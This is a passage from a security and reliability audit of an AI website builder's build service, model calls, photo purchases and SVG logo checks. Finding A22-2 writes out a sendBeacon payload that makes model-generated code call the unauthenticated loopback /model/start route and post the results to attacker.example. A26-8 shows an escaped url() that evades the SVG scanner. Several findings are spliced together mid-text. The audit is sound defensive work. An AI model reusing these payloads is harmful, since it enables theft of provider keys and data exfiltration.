That makes `localFan` true (worker.js:16861), so `call = containerPagesFanLocal`. A non-array request goes to `sync`, which is `containerPagesCall` (worker.js:5497-5500), which POSTs `http://build/model` (worker.js:5311-5316). (2) That hop is `getContainer().fetch`. In the job the shim does a plain `fetch(copy)` (containers-shim.mjs:55). The global fetch is `gatewayFetch`, which hands any non-Supabase origin to the real undici fetch (container-env.mjs:216-217). Nothing sets a dispatcher: a grep for setGlobalDispatcher/headersTimeout/new Agent finds nothing. The image is node:22-slim (Dockerfile:15), and long-post.mjs:29-38 documents the 300 s headers wall itself. (3) `/model` writes no header until `callBuilderModel` resolves (build-server.mjs:2291-2296), and the c…

#### A22-2 · high · confirmed · defect

**Model code that the render check executes can reach the build service's unauthenticated /model and /model/start and spend the platform's provider keys**

- **What**: Every compile executes model-written code twice. The server bundle runs in a child that is dropped to uid `node` but shares the container's network (site-ssr.mjs:103-113 adds only uid/gid). The client bundle runs in a root Chromium with `--no-sandbox` (render-check.mjs:278-283). The build service listens on PORT 8080 on every interface (`server.listen(PORT)`, build-server.mjs:2733), and none of its routes check a credential. Its own guard comment assumes 'Containers are not publicly addressable — the only way in is the Worker route' (1848-1850), which ignores code running inside the container. `/model` calls the provider with `keysFrom(BUILD_KEYS)` and returns the answer (2295). `/model/start` does the same in the background and POSTs the answer to any `report.url` that comes with any non-empty token (2083, 2152, sendModelReport 199-210). build-keys.mjs scrubs the keys from the environment precisely so that model code cannot use them; these routes make them usable over loopback HTTP. - **What goes wrong**: A customer asks the tsx or page lane for a component whose effect runs `navigator.sendBeacon('http://127.0.0.1:8080/model/start', JSON.stringify({ req: { model: '<opus>', max_tokens: 32000, messages: [...] }, report: { url: 'https://attacker.example/x', token: 't' } }))`. 1. When that build ends, the container makes the paid call on the platform's Anthropic or xAI key and posts the full answer to the attacker. 3. This repeats on every edit. No credits are debited, and each queued job also holds the site's chain for up to BUILDER_CALL_MS. The server-side child can do the same with a plain `fetch` at module import, without needing a browser at all.

[...] : ["--no-sandbox", ...]` · site-ssr.mjs:112 `...(as || {})` (uid/gid only).
- **Fix**: Require a per-boot secret header on every route except /health. The Worker passes it to the container and the job child receives it over stdin. Alternatively serve the build service on a root-only Unix socket. Run the SSR child and Chromium without loopback access to the service, for example with a network namespace or an iptables owner match on uid `node`. Accept a `report.url` only on the Worker's own origin.

#### A22-6 · low · unverified · risk

**The render child's stderr and stdout are accumulated without bound inside the shared build service**

- **Where**: `builder/site-ssr.mjs:154-170`, `builder/site-ssr.mjs:177`, `builder/build-server.mjs:1665-1668`
- **What**: The boundary module exists to contain model code. Even so, the parent appends every byte of the child's stderr to one string (`stderr += String(d)`, site-ssr.mjs:170), although only the last 200 characters are ever read (177). It also keeps appending stdout to `buf` after the ready line (155). Node writes to pipes synchronously, so a child printing in a loop pushes as fast as the parent can read. While the service is busy, `uncaughtException` deliberately does not exit (build-server.mjs:1665-1668), so a RangeError from an over-long string is logged once per chunk and the process carries on holding the buffer.
- **What goes wrong**: A model-written component logs in a tight loop, either during render or at module scope before listening. For up to 20 s (start) or 10 s per request, the build service accumulates hundreds of MB, up to V8's string limit. Each further chunk throws `Invalid string length`, which floods the log with stacks, and the memory is retained in the long-lived service that also runs the site's job children.
- **Evidence**: site-ssr.mjs:170 `child.stderr.on("data", (d) => { stderr += String(d); });` · 177 `const tail = stderr.trim().slice(-200);` · build-server.mjs:1667 `if (_busy === 0) process.exit(1);`.
- **Fix**: Keep a bounded tail of stderr (a few KiB, dropping older bytes), cap `buf`, and stop reading stdout once the port line has been read.

### A23 — Model use

The model table (builder/build-models.mjs) maps three pickers to one model each for `design`, `pages` and `quick`. Grok 4.6 is the default (DEFAULT_PICKER), and every router, lane and classifier call follows the picked model through `BUILD_MODELS.quick`. The one exception is web research, which is hardwired to claude-sonnet-5 (worker.js:5036). Every call goes through `callBuilderModel` (builder/build-call.mjs). It routes `grok*` models to xAI's OpenAI-shaped endpoint, translates the request, response and error body into Anthropic's shape (model-xai.mjs), and bounds each call with `AbortSignal.timeout`: 600 s for a build call, 240 s for a synchronous small call, and 480 s or the job's remaining clock for a queued small call. Inside the container, calls ride `longPost` (node:https, which has no undici 300 s headers timeout) and ask the provider to stream; the SSE transcript is folded back into the non-streaming shape. The Worker sends calls non-streamed on workerd fetch, except small calls, which always stream. Band fan-outs run through `runFanout`, at most 8 at a time with the rest queued, inside the build service's `/model/start`, which is serialised by `oneAtATime`. Provider failures are classified by `upstreamKind` and `routeFailure`. `retryHere` decides whether a failed container call may be repeated: anything without a numeric status and not a timeout is treated as 'no request was made'. Input budgets (16,000 characters per message, 48,000 carried) and the context report are pure modules. The context window is not a constraint today; the binding limits are the transport and the clocks, and that is where the defects below are.

A page that is not split is generated through `containerPagesFanLocal`, which hands a non-array request to `containerPagesCall`. Pages are not split for multi-page plans, revises, thin plans, or a shut door, and the door is shut for everyone but one canary account because BAND_SPLIT_EVERYONE defaults to 'off'. `containerPagesCall` POSTs `http://build/model` through the containers shim, which calls Node's global `fetch`, i.e. undici. The build service's `/model` handler writes nothing until the whole generation ends. So the hop meets the 300 s headers timeout that build-call.mjs:66-80 and long-post.mjs:29-38 document, and it fails as `TypeError: fetch failed` with no status. `retryHere({status:null, kind:'TypeError'})` is true. The build gets no pages and is recorded genVia 'worker'. #### A23-2 · high · confirmed · defect

**longPost never settles when the connection drops after the response headers, so per-call caps never fire and the site's container wedges**

- **Where**: `builder/long-post.mjs:76-107`, `builder/build-server.mjs:1392-1409`, `builder/build-server.mjs:2090-2200`, `builder/build-server.mjs:2292`, `builder/container-hold.mjs:90`, `builder/job-duration.mjs:72`, `worker.js:22880-22886`, `builder/build-call.mjs:449-466`, `builder/build-call.mjs:613-616`, `test/container-model-async.test.mjs:328-379`
- **What**: `longPost` settles only on `res 'end'`, on `req 'error'`, or on the abort signal. When a socket dies after headers arrived, Node emits 'aborted'/'close' on the response and 'close' on the request, but not 'end' and not `req 'error'`. IncomingMessage emits 'error' only when a listener exists, and longPost attaches none. The `req 'close'` handler also removes the abort listener (line 107). So the promise never resolves or rejects, and the call's own `AbortSignal.timeout` can no longer reach it. Every container call is streamed, so headers arrive within seconds and nearly a whole generation is spent in exactly this state. The cut-wire handling the code describes ('model stream ended early', the 'LIFETIME CAP' reading of `wire.chars > 0`) is unreachable on this transport.
- **What goes wrong**: A streamed page generation in the build service's /model or /model/start loses its connection mid-stream; the comments themselves anticipate such egress or lifetime cuts. The call never settles. `oneAtATime` is a serial chain, so every later /build compile and /model call on that site's container (`build-k-<slug>`, shared with its edit jobs) queues behind it. The gen beat keeps renewing the build row's lease. `_busy` stays above zero, so `holdDecision` keeps the container alive until MAX_BUSY_HOLD_MS (52.5 min), then the SIGTERM drain waits up to 13 more minutes. For about an hour every edit's compile on that site times out. If the same cut hits a job child's lane or page call, the job hangs until its 50-minute deadline. If the job holds config (`holdsConfig`) under PARALLEL_WRITES, the publish turn is renewed on every heartbeat throughout, so the request's other parts wait for the turn: the same 'waited for the publish turn' symptom as today's live failure, from a different cause.
- **Evidence**: long-post.mjs:92 `res.on("end", ...)` is the only res settlement; :106 `req.on("error", ...)`; :107 `req.on("close", () => { if (signal) signal.removeEventListener("abort", onAbort); });`. Probe (scratchpad lp-probe.mjs): a local server writes 200 plus one SSE chunk and destroys the socket after 200 ms; `longPost(..., {signal: AbortSignal.timeout(1500)})` printed 'STILL PENDING after 4000ms'. build-server.mjs:1405-1406 `const done = _chain.then(fn, fn); _chain = done.then(...)`; container-hold.mjs:90 MAX_BUSY_HOLD_MS = jobDurationPlan().holdMs, computed as 52.5 min; worker.js:22885 renewTurn on the heartbeat
- **Fix**: In longPost, handle `res.on('aborted')`, `res.on('error')` and `res.on('close')` (when not ended) by rejecting with an error that carries `wire`. Remove the abort listener only after settlement, not on `req 'close'`. Add a driven test that cuts the socket after headers, both with and without an abort signal. Separately, consider bounding `oneAtATime` work in the build service, so one model call cannot block compiles for the busy-hold window.

There is no res 'aborted', 'error' or 'close' handler. The req 'close' handler removes the abort listener (:107). In my probe the server sent headers plus one SSE chunk and then closed. On a clean close (socket.end() or destroy(), i.e. FIN mid-body, the 'incomplete chunked read' shape), longPost was still pending after 4,000 ms despite AbortSignal.timeout(1500). #### A23-3 · low (raised medium) · confirmed · defect

**retryHere reads a status-less streamed provider failure as 'no request was made', so it is re-bought and misclassified**

- **Where**: `builder/build-call.mjs:454-466`, `builder/build-call.mjs:538-560`, `builder/build-call.mjs:379-384`, `worker.js:5343-5358`, `builder/build-resume.mjs:802`, `builder/site-ask.mjs:2918-2930`, `builder/request.mjs:1092-1096`
- **What**: `readXaiStream` throws a mid-stream provider error (`xai stream error`) with the provider's envelope in `detail` but no `status`. It also throws 'model stream ended early' without a status after tokens have been generated. `retryHere` answers true for anything with no status that is not a TimeoutError or AbortError. Its own doc says 'EVERYTHING ELSE MEANS NO REQUEST WAS EVER MADE', and its 'ONE CASE THIS GETS WRONG' does not list streams. So the Worker's containerPagesCall makes the generation again, and `resumeDecision` refires a fired build once ('no-request'), even when the provider has said its account is exhausted. `routeFailure` classifies only failures that carry a status, so the same streamed insufficient_quota is reported as `transport` with `billing:false`, and the request driver retries the routing call. Every small call streams in production (QUICK_STREAM), so this applies to routing and lanes as well as builds.
- **What goes wrong**: xAI's balance runs out mid-generation (as in run 70's empty account) and the stream carries `{error:{code:'insufficient_quota'}}`. On the fired build, resumeDecision refires: a second generation that fails the same way after the first partial one was paid. On the synchronous hop, the Worker calls again. A routing call that ends this way is reported as a transport failure, not 'refused on our account', and is retried once.
- **Evidence**: Probe: callBuilderModel({xai:'k'}, {model:'grok-4.6'}, null, send, {stream:true}) on an SSE body with an error chunk threw `Error xai stream error`, status undefined, detail {"error":{"type":"insufficient_quota",...}}; retryHere(...) printed true. build-call.mjs:553-559 `if (f.status) return false; if (f.kind === "TimeoutError" || f.kind === "AbortError") return false; return true;`; build-resume.mjs:802 `if (retryHere(poll)) return again("no-request", { message });`; site-ask.mjs:2918-2919 classifies only when `status !== null`
- **Fix**: Make retryHere refuse when `detail` carries a provider envelope or when the failure came from a stream that had opened. Mark stream errors explicitly (e.g. `e.streamed = true`, `e.reached = true`) and carry them across the /model and /model/start failure shapes. Have routeFailure call `classify` on a detail-bearing error even without a status, so billing and insufficient_quota are read.
- **Check (batch)**: confirmed, low — The core mechanism holds, but the impact is smaller than stated. A probe through callBuilderModel with a fake streamed send gave two results. First, an SSE error chunk throws Error 'xai stream error' with detail carrying the provider envelope and status undefined (build-call.mjs:460-464), and retryHere returns true. Second, a stream without [DONE] or finish_reason throws 'model stream ended early' with no status, and retryHere again returns true (build-call.mjs:553-559). routeFailure calls classify only when status !== null (site-ask.mjs:2918-2925). A streamed routing call goes through quickSend with QUICK_STREAM (worker.js:4472, 4485-4488, 30151), so a status-less envelope is reported kind 'transport', billing false. That contradicts readXaiStream's stated intent that the envelope keep 'the billing sentence' firing (build-call.mjs:449-453). Corrections: (1) Refiring on a cut wire is do…

#### A23-4 · low · unverified · risk

**The request driver retries a failed routing call whatever its class, including deterministic config and billing refusals**

- **Where**: `builder/request.mjs:672-676`, `builder/request.mjs:1090-1096`, `builder/site-ask.mjs:2876-2878`, `builder/site-ask.mjs:2912-2932`
- **What**: `readRoute` reduces every routing failure to `{act:'failed'}` from `b.failed === true`. It ignores the `failure` object that Lane 1b added, which names `config` (key not set), `provider` with `billing:true` (401/402/403 or insufficient_quota), `request`, and so on. `settle` then retries once 'as a job with no answer is'. For config and billing failures the retry is certain to fail the same way: an extra queued job, another provider round trip, and a later answer to the customer.

- **Evidence**: request.mjs:676 `if (b.failed === true) return { act: "failed" };`; request.mjs:1092-1095 `if (read.act === "failed") { if (p.retries < RETRIES) { p.retries++; p.status = "ready"; return; } ...`; site-ask.mjs:2927-2929 billing set for 401/402/403
- **Fix**: Carry `failure.kind` and `failure.billing` through readRoute, and retry only `timeout` or `transport` (and `provider` with 429/5xx). End `config`, `request` and billing refusals at once with their own reason.

### A24 — Prepared answers

A request's parts are written one at a time per site (or up to WRITE_BESIDE_MAX = 3 with PARALLEL_WRITES on). A ready part that is not being written may be PREPARED: `nextStep` claims it (builder/request.mjs:1509-1544, at most PREP_MAX_LIVE = 3 per request), the driver sends a `request-prep` queue message, and `runRequestPrep` (worker.js:21482) takes the claim on the record's etag. It then replays the part's routing and, when the chosen layer is in PREP_LAYERS or is an add-on, its step through the real routes under a preparation context (`makePrepCtx`, `replayPrepared`, each replay with its own 8-minute PREP_RUN_MS budget). This always runs in the Worker. Every model call is recorded under the SHA-256 of its deciding fields (builder/prepared.mjs `requestHash`) and saved to `requests/<slug>/<key>/prep/p<n>-<seq>.json`. When the part's job is claimed, `stagePrepared` (worker.js:21592) copies the right share (route or run), plus answers kept by earlier paused jobs (`stageKept`) and the requirements checkpoint (`stageHeld`), under the job's own id in `jobs/prepared/`. The job then reads that copy, in the container through the job gateway, and `replayer` answers only byte-identical requests, each once. Unfinished or step-refused replies are never replayed; only a refusal's facts may skip a correction (`PriorRefusal`). A preparation that has gone quiet is retried once after PREP_FRESH_MS (10 min), and one whose earlier attempt cannot be read ends `uncertain` with no calls. The exact-match rule protects answers well. The weak points are where the Worker preparation and the container job differ (the parser, the gateway's key wall, the editable-state repair) and what the preparation writes as a side effect.

One sample, recorded before PARALLEL_WRITES was on; the record does not say where the job ran. |
| A preparation whose inputs changed is asked again and never applied stale | offline-only | test/parallel-reuse-run141.test.mjs R141 2; test/parallel-requests.test.mjs XR; docs/history/2026-10-11-parallel-addon.md PI 6. Run 141's re-asked designer is inferred, not observed. |
| Cut-off or step-refused replies are never replayed; only a refusal's facts may skip a correction (PriorRefusal) | offline-only | test/continuation-unusable.test.mjs, test/validation-reuse.test.mjs, test/correction-reuse.test.mjs CR 1–9. backlog line ~1281 says correction reuse needed a deploy; no live run reads `prepUse[].skipped`. |

#### A24-5 · low · unverified · defect

**routedForPrep ignores the part's own routing's held-back parts, so the prepared step is made for a request its job never sends**

The prepared body has instruction = the whole words and no alsoAsked. The job body after settlement has the same instruction plus alsoAsked = the held words, so every prepared step call misses, the part waited for its preparation, and the model work is ours.
- **Evidence**: request.mjs:1640 `Object.assign(p, { route: { ...read.route, hops: 0 }, phase: "run" });` (no carveParts); 1077 `const made = carveParts(rec, p.n, read.alsoAsked, …)`; 512 `if (!parent.held.includes(w)) parent.held.push(w);`; probe output: PREP body without alsoAsked, JOB body with `"alsoAsked":"also make the about page footer say Bye"`.
- **Fix**: In runRequestPrep, when `read.alsoAsked.length` or a needs-first dependency is present, end the preparation 'routed' (do not prepare the step), or build the step's body from a record carved exactly as `settle` would carve it.

#### A24-6 · low · unverified · risk

**PREP_RUN_MS is per replay, so one attempt can run about 13–16 minutes, past PREP_FRESH_MS (10 min), while only purchases check ownership**

- **Where**: `worker.js:20781-20782`, `worker.js:20834-20837`, `worker.js:21510-21546`, `worker.js:21447-21450`, `builder/request.mjs:185-186`, `builder/request.mjs:1556-1564`
- **What**: PREP_RUN_MS is documented as 'How long a preparation may run, at most'. But `replayPrepared` creates a fresh `makeEditBudget(PREP_RUN_MS)` for each replay, and an attempt replays the routing and then the step. Model calls are bounded only by each replay's own budget. `ownsPrep` (with PREP_RUN_MS measured from startedAt) is asked only before a purchase. A slow routing followed by a long step can still be calling models after PREP_FRESH_MS. The driver then treats the attempt as quiet and either claims a second attempt (which replays only what the first had saved so far) or files the part's job, and both make the same calls again. With the queue's max_retries 0 and a 15-minute wall, an attempt killed near the end loses its final save, notePrepared and advanceRequest.
- **What goes wrong**: The routing takes about 3 minutes under provider load, then a page-writer step runs to its roughly 6.75-minute cap: the attempt is still running at 10 minutes. The 2-minute sweep's nextStep finds it not `preparing` (tries 1 < 2) and claims attempt 2 with prev = 1. Attempt 2 re-asks every call attempt 1 had not saved yet, so model calls are duplicated (ours), and attempt 1's outcome is dropped as no longer the owner's.
- **Evidence**: worker.js:20837 `const prep = makePrepCtx({ id, budget: makeEditBudget(PREP_RUN_MS), …})` inside replayPrepared, called twice per attempt (21515 route, 21541 run); request.mjs:1557 `now - prepSince(p.prep) < PREP_FRESH_MS`; worker.js:21449 `if (!ownsPrep(at.rec, n, seq, owner, Date.now(), PREP_RUN_MS)) return false;` is the only ownership check.
- **Fix**: Create one budget per attempt in runRequestPrep and pass it to both replays (or pass the remaining time), so the whole attempt is bounded by PREP_RUN_MS < PREP_FRESH_MS. Optionally gate each model call on `ownsPrep`, as purchases already are.

#### A24-7 · low · unverified · defect

**A staged picture answered by replay.image skips the purchase guard's counter, so a later purchase of the same description reuses the first photo**

- **Where**: `worker.js:21374-21388`, `worker.js:6090-6096`, `builder/prepared.mjs:522-529`
- **What**: In a job, `jobImage` wraps the purchase guard in the replayer (`job.replay.image(once)`). A description answered from staged images never reaches `purchaseGuard`, whose `seen` counter numbers each description's purchases (`k`, part of `purchaseId`). When the job's step is asked fresh and wants the same description more times than the preparation bought, the next ask computes k = 0 instead of k = 1. `purchaseOnce` then finds the preparation's k = 0 record 'bought' and returns the same picture. The preparation itself counts every ask, so the two sides disagree on identities.
- **What goes wrong**: With IMAGE_PURCHASES on: the preparation bought one 'sourdough loaf on a board' photo (k = 0). The job's answer differs (fresh) and asks for that description in two frames. Frame 1 gets the staged photo, and frame 2 goes through the guard with k = 0 and is reused. Both frames show the same picture and no second purchase is made. Unreachable today with IMAGE_PURCHASES=off.
- **Evidence**: worker.js:21380-21382 `const k = seen.get(d) || 0; seen.set(d, k + 1); const out = await purchaseOnce(env, { slug, key, n, d, k, …` ; worker.js:6095-6096 `const once = job && job.purchase ? job.purchase.image(generate) : generate; return job && job.replay ? job.replay.image(once) : once;`; prepared.mjs:527 `if (at >= 0) { spentImg.add(at); imageHits++; return images[at].url; }`
- **Fix**: Count staged-image hits in the guard: have the replayer's image hit tell the guard (seen.set(d, k + 1)), or put the guard outside the replayer and let it consult the staged images per (d, k).

### A25 — Photos

Every photograph the builder buys goes through one function, `makeSitePhoto` (worker.js:2791). It checks `IMAGE_PURCHASES` (worker.js:2812) before the single fal call in `askSitePhoto` (worker.js:2679), then stores the picture under `uploads/<slug>/`, tagged with its purchase id. Request parts buy through durable purchase records under `source/<slug>/purchases/` (`purchaseOnce` worker.js:20949, `purchaseGuard` worker.js:21376), so a retry, a preparation and the part's own job share one purchase. An outcome nobody can tell holds the part `uncertain`, and the request driver moves it on or the customer's buy-again releases it (`purchasesKnown`, `releaseHeldPurchases`). First builds and add-ons start their photographs beside the page writer (`startBuildPhotos`) and join them at the image step (`buySitePhotos`); pending frames are marked and later filled by a placement step (worker.js:34402). The picture rung (`runPictureEdit`, site-picture.mjs:1487) swaps, reframes, removes or clears a photograph; removal is checked against the TypeScript tree, which is only available in the container. A customer's attached photographs are stored only on a Build (`placeAttachedPhotos`); on an existing site only the logo step receives them. `picturesShown` grades bought pictures as published, unconfirmed or not shown. The gateway admits every key the photo path uses (`source/`, `uploads/`, `credits`). However, no test runs a photo purchase through the real gateway, and the reply wording around refused purchases, draft-first and quoted descriptions is wrong in places.

#### A25-2 · medium · refuted · defect

**Descriptions with double quotes give a token that is invalid TSX as written, and any valid rendering misses the early purchase, buying a second photo**

- **What**: `imageDirective` tells the writer to copy `<SafeImage src="@@IMG:${describe}@@" />` VERBATIM, with `describe` unescaped (only the own-photo alt is sanitised). If the designer's description contains a `"`, the verbatim line does not compile. The writer must change the text instead: escape it, use an entity, or drop the quote. The early task (`startBuildPhotos`) keyed its purchase on `shotKey(describe)`, while the image step's buyer keys on the token prompt (`String(prompt)`). The `pending` join therefore misses, and `purchaseOnce` computes a different purchase id. `pictureOutcomes` likewise joins on shotKey(describe) and cannot match what was bought.
- **What goes wrong**: The designer writes describe: 'the "Harbour" sourdough on a floured board'. Probed: the directive line is `src="@@IMG:the "Harbour" sourdough…@@"`. Each valid TSX rendering parses back to a prompt that differs from shotKey(describe): `\"`, `&quot;`, or quotes dropped all give false. A first build or add-on with IMAGE_PURCHASES on buys the early photo, then buys a second one at the image step ($0.15 twice). The first is left 'stored, not on the site', and the reply fact calls the placed picture 'not-placed … so none was bought'. If the writer does copy verbatim, the page fails tsc and is salvaged as a stub.
- **Evidence**: site-images.mjs:1519 `lines.push(`  ${page} — <SafeImage src="@@IMG:${describe}@@" alt="..." />`)`; worker.js:21354 `const d = shotKey(s.describe);` vs worker.js:21287 `const d = String(prompt || "");` and 21304 `if (pending && pending.has(d + "\n" + k))`. Probe output: three renderings → `false` for `t.prompt === m.shotKey(d)`.
- **Fix**: Normalise descriptions to a token-safe form at plan time (no `"`, `@@`, backslashes or braces), applied by both the early task and the directive. Alternatively key the early purchase on exactly the string the directive emits, and have the image step match tokens to planned shots by that same normalised key.
- **Check (batch)**: refuted, low — Part is true: imageDirective emits the describe unescaped (builder/site-images.mjs:1514-1519), while the own-photo alt is sanitised (1489). The described failure does not follow. (1) Copying verbatim is harmless. The image step runs BEFORE the compile (publish-pages.mjs:1323-1363, comment 'it must be before the compile'). applyImages (site-images.mjs:1305-1320) replaces or sweeps the whole token, inner quotes included. Probed: the verbatim line becomes `src=""` or `src="/u/x/a.jpg"`, both valid TSX. validatePages (page-gen.mjs:3199ff) does no syntax parse before that step. So 'fails tsc and is salvaged as a stub' is false. (2) Verbatim copying keeps the join key: parseImageTokens gives prompt === shotKey(describe) (probed true), so the purchaseBuyer pending join (worker.js:21287/21304) matches the early task's key (21354). - **What**: Build and add-on purchases clamp to `MAX_FILES_PER_SITE - stillUploads(...)`, with the stated reason that photos the owner never chose must not fill the 200-file library and get their own uploads refused. - **What goes wrong**: A site has 199 stored images. The customer asks to replace three photos with new ones; three are bought and stored (202 files). The owner's next upload through the panel is refused: 'this site has reached its image limit — delete some first'.
- **Evidence**: worker.js:34573 `if (!imagesAffordable(1, { balance, usd: SITE_PHOTO_USD })) return null;` is the only gate. worker.js:2931 is the build path's `room` clamp; site-uploads.mjs:389 enforces the cap only for uploads.
- **Fix**: Read the library room once in the picture step, as buySitePhotos does, decrement it per purchase, and report a slot left unchanged because the library is full in its own words.

#### A25-8 · low · unverified · risk

**The placement step recomputes the purchase id from a truncated description instead of using the stored id**

- **Where**: `worker.js:21045-21048`, `worker.js:34423-34425`, `worker.js:20950`, `builder/request.mjs:1240`
- **What**: A pending frame carries its purchase `id`, but both `pendingOf` and `readPlace` keep `d.slice(0, 300)`. The placement step calls `purchaseOnce({ d: pp.d, k: pp.k })`, which derives the id again from the sliced `d`, and never compares it with `pp.id`. `d` is the page writer's token text, not the capped designer description. A token longer than 300 characters therefore gets a different purchase id.
- **What goes wrong**: An add-on's writer produces a token prompt of 320 characters; the purchase is held unknown and later lands. The placement job looks up the id derived from the first 300 characters, finds no record, claims it and buys a new photograph for the frame. The original (paid) one is orphaned.
- **Evidence**: worker.js:21047 `d: x.d.slice(0, 300)`; worker.js:34424 `purchaseOnce(env, { …, d: pp.d, k: pp.k, … })`; worker.js:20950 `const id = await purchaseId(slug, key, n, d, k);`.
- **Fix**: Give purchaseOnce an explicit id for placement (read the record at `purchaseKey(slug,key,n,pp.id)`), or refuse when the recomputed id differs from `pp.id`. Do not truncate `d` on paths that recompute ids.

#### A25-9 · low · unverified · risk

**The page's request poll can block for up to ~90 s per held photo while it retries the download**

- **Where**: `worker.js:30922-30924`, `worker.js:21994-22000`, `worker.js:21100-21108`, `worker.js:20910-20919`, `worker.js:2726-2733`
- **What**: Every GET of `/api/site/request/<slug>/<key>` calls advanceRequest. For each `uncertain` part, that calls purchasesKnown, which for a `generated` record runs finishGenerated → storeSitePhoto: up to 3 downloads of the fal source with a 30 s timeout each, then the store, synchronously inside the GET. A source that hangs (rather than answering 404) stalls the poll for each of up to 12 held purchases, on every poll and sweep for a day.
- **What goes wrong**: An add-on holds two purchases recorded `generated`, and fal's CDN host times out. Each page poll of the request waits about 180 s before answering. The client's poll times out and backs off, and the request card looks frozen, while the minute sweep repeats the same downloads.
- **Evidence**: worker.js:30924 `: await advanceRequest(env, ctx, qSlug, qKey, "look");`; worker.js:21102 `const f = await finishGenerated(...)`; worker.js:2727 `fetch(source, { signal: AbortSignal.timeout(30000) })` inside `for (let i = 0; i < PHOTO_TRIES …)`.
- **Fix**: Leave the finishing of `generated` purchases to the sweep (or waitUntil), and keep the GET to a record read. Alternatively cap the total time purchasesKnown may spend per call.

### A26 — Logo, favicon and mark

The logo rung (builder/site-logo.mjs `runLogoEdit`, called at worker.js:34661-34776) makes no model call. It takes the one attached picture, checks its leading bytes, stores it under uploads/<slug>/<sha>.<ext>, and writes it as the `image` form of `look.wordmark` (the header) or of `look.favicon` (when the router set `tab: true`). It reads and merges the whole look under the job's turn and fence, then hands the unchanged pages to the edit's one deferred publish. A removal writes `markRemove`'s form instead: the legacy drawing an upload was hiding, otherwise the floor. site-mark.mjs makes each mark one form (image, svg, or text/initials). `markOf` folds the legacy `config.logo`/`config.icon` keys and legacy strings using the old precedence. `ownedMark` in `mergeLook` stops a design step from replacing a picture a person sent. `markWire` produces the container's four fields for every publish path. site-favicon.mjs is the SVG security boundary: one allow-list scanner (`cleanMark`) serves the tab icon (forced to 64x64), the drawn wordmark (sized from its viewBox) and the animated mark. The design step's required `favicon`/`wordmark` fields and the look lanes all go through it, and the container (`writeSiteBrand`) checks again before writing public/icon.svg or logo.svg, falling back to initials or the name in type. In production (REQUEST_FLOW, PARALLEL_WRITES, DRAFT_FIRST), a logo part's job is replayed from the request record with every file of the request attached. It takes the site's publish turn before reading anything and saves its result as a draft revision, not live.

| What it does | Shown | Evidence |

Both ran before DRAFT_FIRST and PARALLEL_WRITES were on (2026-10-17). Under today's switches the rung is not live-proven: on main the gateway refuses publish-turn/ and requests/ keys, so every request job, logo jobs included, waits out its budget. This is the known live failure, fixed on the branch at db4e73e1. |

No recorded live run of an uploaded tab icon. |

#### A26-6 · low · unverified · defect

**A lost turn or fenced config write in the logo step is reported as a storage failure, so the request never re-runs the part alone**

- **Where**: `builder/site-logo.mjs:156-157`, `builder/site-logo.mjs:204-205`, `worker.js:34748-34753`, `worker.js:13679-13682`, `builder/request.mjs:147`, `builder/request.mjs:1211`
- **What**: Under PARALLEL_WRITES the logo's `save` calls `mayWriteConfig`, which throws `turn-lost: ...` when the turn has lapsed. It then calls `patchSiteConfig` with the job's fence, which answers `{ok:false, error: TURN_FENCED}` when a later turn wrote first. runLogoEdit's bare `catch` turns both into `reason: "store"` with "I couldn't save that just now — your site is unchanged. Try again.", and the route answers `error: "store"`. The request driver re-runs a part alone only for OVERLAP_LOSSES (`conflict`, `turn`, `turn-lost`, `older`). A logo part lost to its own request's overlap is therefore recorded as refused, and the customer is asked to resend. The look lane maps the same throw to `error: "store"` (worker.js:35531).
- **What goes wrong**: A two-part request: the logo plus a colour change. The logo job's turn renewal fails during a store blip and another part takes the turn. The logo's config write is refused by the fence and the part ends 'refused' with "Try again". It should have been re-run alone, which is what the 2026-10-16 overlap rule promises for a part lost to its own request.
- **Evidence**: site-logo.mjs:204-205 `try { await deps.save({ [where]: url }); } catch { return { ok: false, reason: "store", msg: "I couldn't save that just now — your site is unchanged. Try again." }; }`; worker.js:13680 `async function mayWriteConfig(...) { if (!(await turnStillMine(...))) throw new Error(TURN_LOST_WRITE); }`; request.mjs:1211 `if (read.act === "refusal" && OVERLAP_LOSSES.includes(lostCode) ...)`.
- **Fix**: Let the logo rung pass on a turn-lost or fenced error (match `TURN_LOST_WRITE` / `TURN_FENCED`, or have save return a typed failure) and answer `error: "turn-lost"`, as the publish spine does. Do the same for the look lane's write catch.

#### A26-7 · low · unverified · defect

**The SVG validator accepts drawings that do not render (duplicate attributes, zero or negative viewBox size), and the container then replaces the name with a broken image**

- **Where**: `builder/site-favicon.mjs:99`, `builder/site-favicon.mjs:231-266`, `builder/site-favicon.mjs:326-330`, `builder/build-server.mjs:616-626`, `builder/lovable/template/src/components/ui/site-header.tsx:210-217`
- **What**: `cleanMark` checks each attribute against the allow-list but never checks for duplicates, which XML forbids, so the served document fails to parse. VIEWBOX accepts a zero or negative width or height, which disables rendering. `wordmarkSize` turns these into width=1 or abs(width), so the result looks valid. The container sets `SITE_LOGO = "/logo.svg"` for any accepted wordmark, and the header then shows a broken `<img>` instead of the business name. The file's contract, 'a site with a bad mark has no mark, never a broken one', is broken.
- **What goes wrong**: A designer or lane answers `<svg viewBox="0 0 240 64"><path d="..." fill="#123" fill="#456"/></svg>`. readWordmark accepts it (probe: duplicate attributes ACCEPTED; viewBox '0 0 0 64' accepted with width="1"). The container writes logo.svg and every page's header shows a broken-image glyph with alt text where the name in type used to be. A favicon with the same fault leaves the browser's default tab icon.
- **Evidence**: site-favicon.mjs:231-266 builds `attrs` with no seen-set; :99 `const VIEWBOX = /^\s*(-?\d*\.?\d+(?:\s+-?\d*\.?\d+){3})\s*$/;`; :328 `const clamp = (v) => Math.max(1, Math.round(Math.abs(v) || 1));`; build-server.mjs:620-624 writes logo.svg and sets `logoValue = "/logo.svg"`.
- **Fix**: In cleanMark, refuse a repeated attribute name on one tag and a viewBox whose width or height is not greater than 0. Add guard cases to test/site-mark.test.mjs or site-favicon.test.mjs.

#### A26-8 · low · unverified · risk

**A CSS-escaped url() in a presentation attribute passes the 'nothing external' check**

- **Where**: `builder/site-favicon.mjs:256-264`
- **What**: The external-url rule tests the entity-decoded attribute text for `url(` followed by anything but `#`. Presentation attributes are parsed as CSS, and a CSS escape inside the function name (`u\72l(`) still tokenises as `url(`. Such a value passes the scanner and is served as a document from the site's own origin. No script vector follows, because elements and `on*`/`href` stay blocked; the effect is an external fetch where a browser resolves the reference (for example a top-level view of /icon.svg or /logo.svg). It breaks the documented guarantee that no value may 'reach outside the document'.
- **What goes wrong**: A model writes `fill="u\72l(https://tracker.example/p.svg#g)"`. cleanFavicon, readWordmark and cleanGif all accept it (probe: OK, svg, OK). The container writes it to the site's public/ directory.
